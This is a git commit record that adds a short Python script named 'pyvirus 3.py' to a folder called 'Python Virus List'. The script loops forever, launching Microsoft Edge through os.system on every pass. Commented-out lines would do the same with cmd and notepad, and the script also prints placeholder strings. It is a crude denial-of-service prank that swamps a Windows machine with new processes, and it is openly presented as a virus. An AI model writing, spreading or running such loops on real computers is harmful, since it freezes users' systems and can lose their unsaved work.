8802bd78690419db463e85cd11a7b80deb92998b
Palash Ahmed <49250151+palahsu@users.noreply.github.com>
2021-02-01 15:33:53 +0600

    Add files via upload

---
+++ Python Virus List/pyvirus 3.py
@@ -0,0 +1,10 @@
+import os
+
+while True:
+    #var = os.system('start cmd')
+    #var2 = os.system('start notepad')
+    var3 = os.system('microsoftedge ')
+    print ("var")
+    print ("var2")
+    print ("var3")
+         
